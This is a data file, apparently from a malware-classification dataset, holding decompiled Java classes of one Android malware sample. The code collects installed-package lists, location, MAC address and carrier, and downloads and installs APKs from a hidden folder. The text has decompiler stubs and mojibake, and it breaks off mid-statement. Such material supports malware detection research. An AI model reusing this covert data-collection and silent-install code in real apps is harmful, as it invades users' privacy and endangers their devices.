"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.onlineconfig\SeleucoConfigureListener.code","public interface SeleucoConfigureListener {   void onDataReceived(  JSONObject jSONObject); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common\a.code","public class a {   public static final String a=""/download/.um"";   public static final String b=""type"";   public static final String f140c=""package"";   public static final String d=""channel"";   public static final String e=""idmd5"";   public static final String f=""version_code"";   public static final String g=""appkey"";   public static final String h=""sdk_version"";   public static final String i=""proto_ver"";   public static final String j=""old_md5"";   public static final String k=""delta"";   public static final String l="" ä¸‹è½½å¤±è´¥ã€‚"";   public static final String m=""æ­£åœ¨ä¸‹è½½åº”ç”¨"";   public static final String n=""æ­£åœ¨ä¸‹è½½ä¸­ï¼Œè¯·ç¨�ç­‰ ..."";   public static final String o=""ä¸‹è½½å®Œæˆ�ï¼Œè¯·ç‚¹å‡»å®‰è£…"";   public static final String p=""æ›´æ–°å®Œæˆ�ï¼Œè¯·ç‚¹å‡»å®‰è£…"";   public static final String q=""æ­£åœ¨æ›´æ–°å®‰è£…åŒ…"";   public static String r=null; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common\b.code","public class b {   protected static final String a=b.class.getName();   protected static final String b=""Unknown"";   public static final int f141c=8;   private static final String d=""2G/3G"";   private static final String e=""Wi-Fi"";   public static boolean a(  String str,  Context context){     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    PackageManager.NameNotFoundException e2) {       return false;     }   }   public static boolean a(  Context context){     return context.getResources().getConfiguration().locale.toString().equals(Locale.CHINA.toString());   }   public static Set<String> b(  Context context){     int i=0;     HashSet hashSet=new HashSet();     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     while (true) {       int i2=i;       if (i2 < installedPackages.size()) {         hashSet.add(installedPackages.get(i2).packageName);         i=i2 + 1;       }  else {         return hashSet;       }     }   }   public static boolean c(  Context context){     return context.getResources().getConfiguration().orientation == 1;   }   public static String d(  Context context){     try {       return String.valueOf(context.getPackageManager().getPackageInfo(context.getPackageName(),0).versionCode);     }  catch (    PackageManager.NameNotFoundException e2) {       return b;     }   }   public static String e(  Context context){     try {       return context.getPackageManager().getPackageInfo(context.getPackageName(),0).versionName;     }  catch (    PackageManager.NameNotFoundException e2) {       return b;     }   }   public static boolean a(  Context context,  String str){     return context.getPackageManager().checkPermission(str,context.getPackageName()) == 0;   }   public static String f(  Context context){     ApplicationInfo applicationInfo;     PackageManager packageManager=context.getPackageManager();     try {       applicationInfo=packageManager.getApplicationInfo(context.getPackageName(),0);     }  catch (    PackageManager.NameNotFoundException e2) {       applicationInfo=null;     }     return (String)(applicationInfo != null ? packageManager.getApplicationLabel(applicationInfo) : """");   }   public static String[] a(  GL10 gl10){     try {       return new String[]{gl10.glGetString(7936),gl10.glGetString(7937)};     }  catch (    Exception e2) {       Log.b(a,""Could not read gpu infor:"",e2);       return new String[0];     }   }   public static java.lang.String a(){     throw new UnsupportedOperationException(""Method not decompiled: com.seleuco.common.b.a():java.lang.String"");   }   public static java.lang.String g(  android.content.Context r4){     throw new UnsupportedOperationException(""Method not decompiled: com.seleuco.common.b.g(android.content.Context):java.lang.String"");   }   public static String h(  Context context){     return g.b(g(context));   }   public static String i(  Context context){     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");       if (telephonyManager == null) {         return b;       }       return telephonyManager.getNetworkOperatorName();     }  catch (    Exception e2) {       e2.printStackTrace();       return b;     }   }   public static String j(  Context context){     try {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       return String.valueOf(displayMetrics.heightPixels) + ""*"" + String.valueOf(displayMetrics.widthPixels);     }  catch (    Exception e2) {       e2.printStackTrace();       return b;     }   }   public static String[] k(  Context context){     String[] strArr={b,b};     if (context.getPackageManager().checkPermission(""android.permission.ACCESS_NETWORK_STATE"",context.getPackageName()) != 0) {       strArr[0]=b;       return strArr;     }     ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");     if (connectivityManager == null) {       strArr[0]=b;       return strArr;     }     if (connectivityManager.getNetworkInfo(1).getState() == NetworkInfo.State.CONNECTED) {       strArr[0]=e;       return strArr;     }     NetworkInfo networkInfo=connectivityManager.getNetworkInfo(0);     if (networkInfo.getState() != NetworkInfo.State.CONNECTED) {       return strArr;     }     strArr[0]=d;     strArr[1]=networkInfo.getSubtypeName();     return strArr;   }   public static boolean l(  Context context){     return e.equals(k(context)[0]);   }   public static Location m(  Context context){     Location location;     Location lastKnownLocation;     try {       LocationManager locationManager=(LocationManager)context.getSystemService(""location"");       if (a(context,""android.permission.ACCESS_FINE_LOCATION"") && (lastKnownLocation=locationManager.getLastKnownLocation(""gps"")) != null) {         Log.c(a,""get location from gps:"" + lastKnownLocation.getLatitude() + "",""+ lastKnownLocation.getLongitude());         location=lastKnownLocation;       }  else       if (a(context,""android.permission.ACCESS_COARSE_LOCATION"") && (location=locationManager.getLastKnownLocation(""network"")) != null) {         Log.c(a,""get location from network:"" + location.getLatitude() + "",""+ location.getLongitude());       }  else {         Log.c(a,""Could not get location from GPS or Cell-id, lack ACCESS_COARSE_LOCATION or ACCESS_COARSE_LOCATION permission?"");         location=null;       }       return location;     }  catch (    Exception e2) {       Log.b(a,e2.getMessage());       return null;     }   }   public static boolean n(  Context context){     try {       NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();       if (activeNetworkInfo != null) {         return activeNetworkInfo.isConnectedOrConnecting();       }       return false;     }  catch (    Exception e2) {       return true;     }   }   public static boolean b(){     return Environment.getExternalStorageState().equals(""mounted"");   }   public static int o(  Context context){     try {       Calendar calendar=Calendar.getInstance(y(context));       if (calendar != null) {         return calendar.getTimeZone().getRawOffset() / 3600000;       }     }  catch (    Exception e2) {       Log.a(a,""error in getTimeZone"",e2);     }     return 8;   }   public static String[] p(  Context context){     String[] strArr=new String[2];     try {       Locale y=y(context);       if (y != null) {         strArr[0]=y.getCountry();         strArr[1]=y.getLanguage();       }       if (TextUtils.isEmpty(strArr[0])) {         strArr[0]=b;       }       if (TextUtils.isEmpty(strArr[1])) {         strArr[1]=b;       }     }  catch (    Exception e2) {       Log.b(a,""error in getLocaleInfo"",e2);     }     return strArr;   }   private static Locale y(  Context context){     Locale locale=null;     try {       Configuration configuration=new Configuration();       Settings.System.getConfiguration(context.getContentResolver(),configuration);       if (configuration != null) {         locale=configuration.locale;       }     }  catch (    Exception e2) {       Log.b(a,""fail to read user config locale"");     }     if (locale == null) {       return Locale.getDefault();     }     return locale;   }   public static String q(  Context context){     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),128);       if (applicationInfo != null) {         return applicationInfo.metaData.getString(""EmuMeta"").trim();       }     }  catch (    Exception e2) {       Log.b(a,""Could not read EmuMeta meta-data from AndroidManifest.xml."",e2);     }     return null;   }   public static String r(  Context context){     WifiManager wifiManager;     try {       wifiManager=(WifiManager)context.getSystemService(""wifi"");     }  catch (    Exception e2) {       Log.e(a,""Could not get mac address."" + e2.toString());     }     if (a(context,""android.permission.ACCESS_WIFI_STATE"")) {       return wifiManager.getConnectionInfo().getMacAddress();     }     Log.e(a,""Could not get mac address.[no permission android.permission.ACCESS_WIFI_STATE"");     return """";   }   public static String s(  Context context){     int i;     int i2;     try {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       if ((context.getApplicationInfo().flags & 8192) == 0) {         i2=a(displayMetrics,""noncompatWidthPixels"");         i=a(displayMetrics,""noncompatHeightPixels"");       }  else {         i=-1;         i2=-1;       }       if (i2 == -1 || i == -1) {         i2=displayMetrics.widthPixels;         i=displayMetrics.heightPixels;       }       StringBuffer stringBuffer=new StringBuffer();       stringBuffer.append(i2);       stringBuffer.append(""*"");       stringBuffer.append(i);       return stringBuffer.toString();     }  catch (    Exception e2) {       Log.b(a,""read resolution fail"",e2);       return b;     }   }   private static int a(  Object obj,  String str){     try {       Field declaredField=DisplayMetrics.class.getDeclaredField(str);       declaredField.setAccessible(true);       return declaredField.getInt(obj);     }  catch (    Exception e2) {       e2.printStackTrace();       return -1;     }   }   public static String t(  Context context){     try {       return ((TelephonyManager)context.getSystemService(""phone"")).getNetworkOperatorName();     }  catch (    Exception e2) {       Log.a(a,""read carrier fail"",e2);       return b;     }   }   public static String a(  Date date){     return new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"").format(date);   }   public static String c(){     return new SimpleDateFormat(""yyyy-MM-dd"").format(new Date());   }   public static Date a(  String str){     try {       return new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"").parse(str);     }  catch (    Exception e2) {       return null;     }   }   public static int a(  Date date,  Date date2){     if (!date.after(date2)) {       date2=date;       date=date2;     }     return (int)((date.getTime() - date2.getTime()) / 1000);   }   public static String u(  Context context){     Object obj;     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),128);       if (applicationInfo != null && applicationInfo.metaData != null && (obj=applicationInfo.metaData.get(""Seleuco_CHANNEL"")) != null) {         String obj2=obj.toString();         if (obj2 == null) {           Log.a(a,""Could not read Seleuco_CHANNEL meta-data from AndroidManifest.xml."");         }  else {           return obj2;         }       }     }  catch (    Exception e2) {       Log.a(a,""Could not read Seleuco_CHANNEL meta-data from AndroidManifest.xml."");       e2.printStackTrace();     }     return b;   }   public static String v(  Context context){     return context.getPackageName();   }   public static String w(  Context context){     return context.getPackageManager().getApplicationLabel(context.getApplicationInfo()).toString();   }   public static boolean x(  Context context){     try {       return (context.getApplicationInfo().flags & 2) != 0;     }  catch (    Exception e2) {       return false;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common\c.code","public class c {   private static final String a=c.class.getName();   private static c b=null;   private static String f142c=null;   private static Class d=null;   private static Class e=null;   private static Class f=null;   private static Class g=null;   private static Class h=null;   private static Class i=null;   private static Class j=null;   private c(  String str){     try {       e=Class.forName(str + "".R$drawable"");     }  catch (    ClassNotFoundException e2) {       Log.b(a,e2.getMessage());     }     try {       f=Class.forName(str + "".R$layout"");     }  catch (    ClassNotFoundException e3) {       Log.b(a,e3.getMessage());     }     try {       d=Class.forName(str + "".R$id"");     }  catch (    ClassNotFoundException e4) {       Log.b(a,e4.getMessage());     }     try {       g=Class.forName(str + "".R$anim"");     }  catch (    ClassNotFoundException e5) {       Log.b(a,e5.getMessage());     }     try {       h=Class.forName(str + "".R$style"");     }  catch (    ClassNotFoundException e6) {       Log.b(a,e6.getMessage());     }     try {       i=Class.forName(str + "".R$string"");     }  catch (    ClassNotFoundException e7) {       Log.b(a,e7.getMessage());     }     try {       j=Class.forName(str + "".R$array"");     }  catch (    ClassNotFoundException e8) {       Log.b(a,e8.getMessage());     }   }   public static synchronized c a(  Context context){     c cVar; synchronized (c.class) {       if (b == null) {         f142c=f142c != null ? f142c : context.getPackageName();         b=new c(f142c);       }       cVar=b;     }     return cVar;   }   public static void a(  String str){     f142c=str;   }   public int b(  String str){     return a(g,str);   }   public int c(  String str){     return a(d,str);   }   public int d(  String str){     return a(e,str);   }   public int e(  String str){     return a(f,str);   }   public int f(  String str){     return a(h,str);   }   public int g(  String str){     return a(i,str);   }   public int h(  String str){     return a(j,str);   }   private int a(  Class<?> cls,  String str){     if (cls == null) {       Log.b(a,""getRes(null,"" + str + "")"");       throw new IllegalArgumentException(""ResClass is not initialized. Please make sure you have added neccessary resources. Also make sure you have "" + f142c + "".R$* configured in obfuscation. field=""+ str);     }     try {       return cls.getField(str).getInt(str);     }  catch (    Exception e2) {       Log.b(a,""getRes("" + cls.getName() + "", ""+ str+ "")"");       Log.b(a,""Error getting resource. Make sure you have copied all resources (res/) from SDK to your project. "");       Log.b(a,e2.getMessage());       return -1;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common\Log.code","public class Log {   public static boolean LOG=false;   public static void a(  String str,  String str2){     if (LOG) {       android.util.Log.i(str,str2);     }   }   public static void a(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.i(str,exc.toString() + "":  ["" + str2+ ""]"");     }   }   public static void b(  String str,  String str2){     if (LOG) {       android.util.Log.e(str,str2);     }   }   public static void b(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.e(str,exc.toString() + "":  ["" + str2+ ""]"");       for (      StackTraceElement stackTraceElement : exc.getStackTrace()) {         android.util.Log.e(str,""        at\t "" + stackTraceElement.toString());       }     }   }   public static void c(  String str,  String str2){     if (LOG) {       android.util.Log.d(str,str2);     }   }   public static void c(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.d(str,exc.toString() + "":  ["" + str2+ ""]"");     }   }   public static void d(  String str,  String str2){     if (LOG) {       android.util.Log.v(str,str2);     }   }   public static void d(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.v(str,exc.toString() + "":  ["" + str2+ ""]"");     }   }   public static void e(  String str,  String str2){     if (LOG) {       android.util.Log.w(str,str2);     }   }   public static void e(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.w(str,exc.toString() + "":  ["" + str2+ ""]"");       for (      StackTraceElement stackTraceElement : exc.getStackTrace()) {         android.util.Log.w(str,""        at\t "" + stackTraceElement.toString());       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.a\a.code","public class a {   public static int a(  Context context){     return com.seleuco.common.c.a(context).c(""seleuco_common_description"");   }   public static int b(  Context context){     return com.seleuco.common.c.a(context).c(""seleuco_common_progress_text"");   }   public static int c(  Context context){     return com.seleuco.common.c.a(context).c(""seleuco_common_progress_bar"");   }   public static int d(  Context context){     return com.seleuco.common.c.a(context).c(""seleuco_common_title"");   }   public static int e(  Context context){     return com.seleuco.common.c.a(context).c(""seleuco_common_appIcon"");   }   public static int f(  Context context){     return com.seleuco.common.c.a(context).c(""seleuco_common_rich_notification_continue"");   }   public static int g(  Context context){     return com.seleuco.common.c.a(context).c(""seleuco_common_rich_notification_pause"");   }   public static int h(  Context context){     return com.seleuco.common.c.a(context).c(""seleuco_common_rich_notification_cancel"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.a\b.code","public class b {   public static int a(  Context context){     return com.seleuco.common.c.a(context).e(""seleuco_common_download_notification"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.a\c.code","public class c {   public static int a(  Context context){     return com.seleuco.common.c.a(context).g(""seleuco_common_network_break_alert"");   }   public static int b(  Context context){     return com.seleuco.common.c.a(context).g(""seleuco_common_action_info_exist"");   }   public static int c(  Context context){     return com.seleuco.common.c.a(context).g(""seleuco_common_info_interrupt"");   }   public static int d(  Context context){     return com.seleuco.common.c.a(context).g(""seleuco_common_action_pause"");   }   public static int e(  Context context){     return com.seleuco.common.c.a(context).g(""seleuco_common_action_continue"");   }   public static int f(  Context context){     return com.seleuco.common.c.a(context).g(""seleuco_common_action_cancel"");   }   public static int g(  Context context){     return com.seleuco.common.c.a(context).g(""seleuco_common_download_notification_prefix"");   }   public static int h(  Context context){     return com.seleuco.common.c.a(context).g(""seleuco_common_download_failed"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6753c090class a extends SQLiteOpenHelper {   private static final int b=2;   private static final String f150c=""CREATE TABLE umeng_download_task_list (cp TEXT, url TEXT, progress INTEGER, extra TEXT, last_modified TEXT, UNIQUE (cp,url) ON CONFLICT ABORT);"";   a(  Context context){     super(context,c.f149c,(SQLiteDatabase.CursorFactory)null,2);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     Log.c(c.a,f150c);     sQLiteDatabase.execSQL(f150c);   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){   } } public interface a {   void a(  int i);   void a(  int i,  int i2);   void a(  int i,  Exception exc);   void a(  int i,  String str); } public interface a {   void a();   void a(  o.a aVar); } public interface a {   void a(  o.a aVar);   void a(  b bVar); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5cce8b38class b implements ServiceConnection {   final a a;   public b(  a aVar){     this.a=aVar;   }   @Override public void onServiceConnected(  ComponentName componentName,  IBinder iBinder){     String str;     String str2;     String str3;     String str4;     String str5;     String[] strArr;     boolean z;     Messenger messenger;     Log.c(a.b,""ServiceConnection.onServiceConnected"");     this.a.e=new Messenger(iBinder);     if (this.a.d != null) {       this.a.d.a();     }     try {       Message obtain=Message.obtain((Handler)null,4);       str=this.a.f;       str2=this.a.g;       str3=this.a.h;       a.C0001a c0001a=new a.C0001a(str,str2,str3);       str4=this.a.i;       c0001a.d=str4;       str5=this.a.j;       c0001a.e=str5;       strArr=this.a.k;       c0001a.f=strArr;       z=this.a.l;       c0001a.g=z;       obtain.setData(c0001a.a());       obtain.replyTo=this.a.a;       messenger=this.a.e;       messenger.send(obtain);     }  catch (    RemoteException e) {     }   }   @Override public void onServiceDisconnected(  ComponentName componentName){     Log.c(a.b,""ServiceConnection.onServiceDisconnected"");     this.a.e=null;   } } private static class b {   public static final c a=new c();   private b(){   } } public class b extends Thread {   private Context b;   private String f144c;   private int d;   private long e;   private long f;   private int g=-1;   private int h;   private a i;   private a.C0001a j;   public b(  Context context,  a.C0001a c0001a,  int i,  int i2,  a aVar){     long[] jArr;     this.d=0;     this.e=-1L;     this.f=-1L;     try {       this.b=context;       this.j=c0001a;       this.d=i2;       if (DownloadingService.w.containsKey(Integer.valueOf(i)) && (jArr=((d)DownloadingService.w.get(Integer.valueOf(i))).f) != null && jArr.length > 1) {         this.e=jArr[0];         this.f=jArr[1];       }       this.i=aVar;       this.h=i;       if (com.seleuco.common.b.b()) {         this.f144c=Environment.getExternalStorageDirectory().getCanonicalPath();         new File(this.f144c).mkdirs();       }  else {         this.f144c=this.b.getFilesDir().getAbsolutePath();       }       this.f144c+=""/download/.um/apk"";       new File(this.f144c).mkdirs();     }  catch (    Exception e) {       Log.c(DownloadingService.o,e.getMessage(),e);       this.i.a(this.h,e);     }   }   @Override public void run(){     this.d=0;     try {       if (this.i != null) {         this.i.a(this.h);       }       a(this.e > 0);       if (DownloadingService.v.size() <= 0) {         DownloadingService.this.stopSelf();       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   public void a(  int i){     this.g=i;   }   private void a(  boolean r14){     throw new UnsupportedOperationException(""Method not decompiled: com.seleuco.common.net.DownloadingService.b.a(boolean):void"");   }   private void a(  Exception exc){     Log.b(DownloadingService.o,""can not install. "" + exc.getMessage());     if (this.i != null) {       this.i.a(this.h,exc);     }     DownloadingService.this.a(this.j,this.e,this.f,this.d);   } } private class b extends AsyncTask<Integer,Integer,o.a> {   private n b;   private a f153c;   public b(  n nVar,  a aVar){     this.b=nVar;     this.f153c=aVar;   }   @Override protected void onPreExecute(){     if (this.f153c != null) {       this.f153c.a();     }   }   @Override public void onPostExecute(  o.a aVar){     if (this.f153c != null) {       this.f153c.a(aVar);     }   }   @Override public o.a doInBackground(  Integer... numArr){     return m.this.a(this.b);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\c.code","public class c {   private static final String a=c.class.getName();   private static final String b=""seleuco_download_task_list"";   private static final String f149c=""UMENG_DATA"";   private static final String d=""cp"";   private static final String e=""url"";   private static final String f=""progress"";   private static final String g=""last_modified"";   private static final String h=""extra"";   private static Context i=null;   private static final String j=""yyyy-MM-dd HH:mm:ss"";   private a k;   private c(){     this.k=new a(i);   } private static class b {     public static final c a=new c();     private b(){     }   }   public static c a(  Context context){     if (i == null && context == null) {       throw new NullPointerException();     }     if (i == null) {       i=context;     }     return b.a;   }   public boolean a(  String str,  String str2){     Exception e2;     boolean z;     Cursor query;     ContentValues contentValues=new ContentValues();     contentValues.put(d,str);     contentValues.put(e,str2);     contentValues.put(f,(Integer)0);     contentValues.put(g,com.seleuco.common.util.g.a());     try {       query=this.k.getReadableDatabase().query(b,new String[]{f},""cp=? and url=?"",new String[]{str,str2},null,null,null,""1"");       if (query.getCount() > 0) {         Log.c(a,""insert("" + str + "", ""+ str2+ ""):  already exists in the db. Insert is cancelled."");         z=false;       }  else {         long insert=this.k.getWritableDatabase().insert(b,null,contentValues);         boolean z2=insert != -1;         try {           Log.c(a,""insert("" + str + "", ""+ str2+ ""): rowid=""+ insert);           z=z2;         }  catch (        Exception e3) {           z=z2;           e2=e3;           Log.c(a,""insert("" + str + "", ""+ str2+ ""): ""+ e2.getMessage(),e2);           return z;         }       }     }  catch (    Exception e4) {       e2=e4;       z=false;     }     try {       query.close();     }  catch (    Exception e5) {       e2=e5;       Log.c(a,""insert("" + str + "", ""+ str2+ ""): ""+ e2.getMessage(),e2);       return z;     }     return z;   }   public void a(  String str,  String str2,  int i2){     ContentValues contentValues=new ContentValues();     contentValues.put(f,Integer.valueOf(i2));     contentValues.put(g,com.seleuco.common.util.g.a());     this.k.getWritableDatabase().update(b,contentValues,""cp=? and url=?"",new String[]{str,str2});     Log.c(a,""updateProgress("" + str + "", ""+ str2+ "", ""+ i2+ "")"");   }   public void a(  String str,  String str2,  String str3){     ContentValues contentValues=new ContentValues();     contentValues.put(h,str3);     contentValues.put(g,com.seleuco.common.util.g.a());     this.k.getWritableDatabase().update(b,contentValues,""cp=? and url=?"",new String[]{str,str2});     Log.c(a,""updateExtra("" + str + "", ""+ str2+ "", ""+ str3+ "")"");   }   public int b(  String str,  String str2){     int i2;     Cursor query=this.k.getReadableDatabase().query(b,new String[]{f},""cp=? and url=?"",new String[]{str,str2},null,null,null,""1"");     if (query.getCount() <= 0) {       i2=-1;     }  else {       query.moveToFirst();       i2=query.getInt(0);     }     query.close();     return i2;   }   public String c(  String str,  String str2){     String str3=null;     Cursor query=this.k.getReadableDatabase().query(b,new String[]{h},""cp=? and url=?"",new String[]{str,str2},null,null,null,""1"");     if (query.getCount() > 0) {       query.moveToFirst();       str3=query.getString(0);     }     query.close();     return str3;   }   public Date d(  String str,  String str2){     Date date=null;     Cursor query=this.k.getReadableDatabase().query(b,new String[]{g},""cp=? and url=?"",new String[]{str,str2},null,null,null,null);     if (query.getCount() > 0) {       query.moveToFirst();       String string=query.getString(0);       Log.c(a,""getLastModified("" + str + "", ""+ str2+ ""): ""+ string);       try {         date=new SimpleDateFormat(j).parse(string);       }  catch (      Exception e2) {         Log.c(a,e2.getMessage());       }     }     query.close();     return date;   }   public void e(  String str,  String str2){     this.k.getWritableDatabase().delete(b,""cp=? and url=?"",new String[]{str,str2});     Log.c(a,""delete("" + str + "", ""+ str2+ "")"");   }   public List<String> a(  String str){     Cursor query=this.k.getReadableDatabase().query(b,new String[]{e},""cp=?"",new String[]{str},null,null,null,""1"");     ArrayList arrayList=new ArrayList();     query.moveToFirst();     while (!query.isAfterLast()) {       arrayList.add(query.getString(0));       query.moveToNext();     }     query.close();     return arrayList;   }   public void a(  int i2){     try {       Date date=new Date(new Date().getTime() - (i2 * 1000));       this.k.getWritableDatabase().execSQL("" DELETE FROM umeng_download_task_list WHERE strftime('yyyy-MM-dd HH:mm:ss', last_modified)<=strftime('yyyy-MM-dd HH:mm:ss', '"" + new SimpleDateFormat(j).format(date) + ""')"");       Log.c(a,""clearOverdueTasks("" + i2 + "") remove all tasks before ""+ new SimpleDateFormat(j).format(date));     }  catch (    Exception e2) {       Log.b(a,e2.getMessage());     }   }   public void finalize(){     this.k.close();   } class a extends SQLiteOpenHelper {     private static final int b=2;     private static final String f150c=""CREATE TABLE umeng_download_task_list (cp TEXT, url TEXT, progress INTEGER, extra TEXT, last_modified TEXT, UNIQUE (cp,url) ON CONFLICT ABORT);"";     a(    Context context){       super(context,c.f149c,(SQLiteDatabase.CursorFactory)null,2);     }     @Override public void onCreate(    SQLiteDatabase sQLiteDatabase){       Log.c(c.a,f150c);       sQLiteDatabase.execSQL(f150c);     }     @Override public void onUpgrade(    SQLiteDatabase sQLiteDatabase,    int i,    int i2){     }   } } !org.eclipse.jdt.core.dom.TypeDeclaration@af6b4e5public static class c extends AsyncTask<Object,Integer,Drawable> {   private Context a;   private String b;   private ImageView f157c;   private b d;   private boolean e;   private a f;   private Animation g;   private boolean h;   private File i;   public c(  Context context,  ImageView imageView,  String str,  b bVar,  File file,  boolean z,  a aVar,  Animation animation,  boolean z2){     this.i=file;     this.a=context;     this.b=str;     this.f=aVar;     this.d=bVar;     this.e=z;     this.g=animation;     this.f157c=imageView;     this.h=z2;   }   @Override protected void onPreExecute(){     super.onPreExecute();     if (this.f != null) {       this.f.a(this.d);     }   }   @Override public void onPostExecute(  Drawable drawable){     p.b(this.a,this.f157c,drawable,this.e,this.f,this.g,this.h,this.b);   }   @Override public Drawable doInBackground(  Object... objArr){     if (p.a) {       try {         Thread.sleep(3000L);       }  catch (      InterruptedException e) {         e.printStackTrace();       }     }     if (this.i != null && this.i.exists()) {       Drawable c2=p.c(this.i.getAbsolutePath());       if (c2 == null) {         this.i.delete();       }       Log.c(p.b,""get drawable from cacheFile."");       return c2;     }     try {       p.a(this.a,this.b);       File b=p.b(this.a,this.b);       Drawable c3=(b == null || !b.exists()) ? null : p.c(b.getAbsolutePath());       Log.c(p.b,""get drawable from net else file."");       return c3;     }  catch (    Exception e2) {       Log.e(p.b,e2.toString(),e2);       return null;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\C0001a.code","public static class C0001a {   public String a;   public String b;   public String f148c;   public String d;   public String e;   public String[] f=null;   public boolean g=false;   public C0001a(  String str,  String str2,  String str3){     this.a=str;     this.b=str2;     this.f148c=str3;   }   public Bundle a(){     Bundle bundle=new Bundle();     bundle.putString(""mComponentName"",this.a);     bundle.putString(""mTitle"",this.b);     bundle.putString(""mUrl"",this.f148c);     bundle.putString(""mMd5"",this.d);     bundle.putString(""mTargetMd5"",this.e);     bundle.putStringArray(""reporturls"",this.f);     bundle.putBoolean(""rich_notification"",this.g);     return bundle;   }   public static C0001a a(  Bundle bundle){     C0001a c0001a=new C0001a(bundle.getString(""mComponentName""),bundle.getString(""mTitle""),bundle.getString(""mUrl""));     c0001a.d=bundle.getString(""mMd5"");     c0001a.e=bundle.getString(""mTargetMd5"");     c0001a.f=bundle.getStringArray(""reporturls"");     c0001a.g=bundle.getBoolean(""rich_notification"");     return c0001a;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6c3d5082public static class d {   b a;   Notification b;   int f145c;   int d;   a.C0001a e;   long[] f=new long[3];   public d(  a.C0001a c0001a,  int i){     this.f145c=i;     this.e=c0001a;   }   public void a(){     DownloadingService.w.put(Integer.valueOf(this.f145c),this);   }   public void b(){     if (DownloadingService.w.containsKey(Integer.valueOf(this.f145c))) {       DownloadingService.w.remove(Integer.valueOf(this.f145c));     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\DownloadingService.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7b22c5b1"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\e.code","public class e extends AsyncTask<String,Void,Integer> {   public int a;   public String b;   private a.C0001a d;   public e(  int i,  a.C0001a c0001a,  String str){     this.a=i;     this.d=c0001a;     this.b=str;   }   @Override protected void onPreExecute(){     super.onPreExecute();   }   @Override public Integer doInBackground(  String... strArr){     int a=DeltaUpdate.a(strArr[0],strArr[1],strArr[2]) + 1;     new File(strArr[2]).delete();     if (a != 1) {       Log.a(DownloadingService.o,""file patch error"");     }  else {       if (!com.seleuco.common.util.g.a(new File(strArr[1])).equalsIgnoreCase(this.d.e)) {         Log.a(DownloadingService.o,""file patch error"");         return 0;       }       Log.a(DownloadingService.o,""file patch success"");     }     return Integer.valueOf(a);   }   @Override public void onPostExecute(  Integer num){     if (num.intValue() != 1) {       DownloadingService.this.p.cancel(this.a + 1);       Bundle bundle=new Bundle();       bundle.putString(DownloadingService.l,this.b);       Message obtain=Message.obtain();       obtain.what=5;       obtain.arg1=3;       obtain.arg2=this.a;       obtain.setData(bundle);       try {         if (DownloadingService.v.get(this.d) != null) {           ((Messenger)DownloadingService.v.get(this.d)).send(obtain);         }         DownloadingService.this.a(this.a);         return;       }  catch (      RemoteException e) {         DownloadingService.this.a(this.a);         return;       }     }     Notification notification=new Notification(R.drawable.stat_sys_download_done,com.seleuco.common.a.p,System.currentTimeMillis());     Intent intent=new Intent(""android.intent.action.VIEW"");     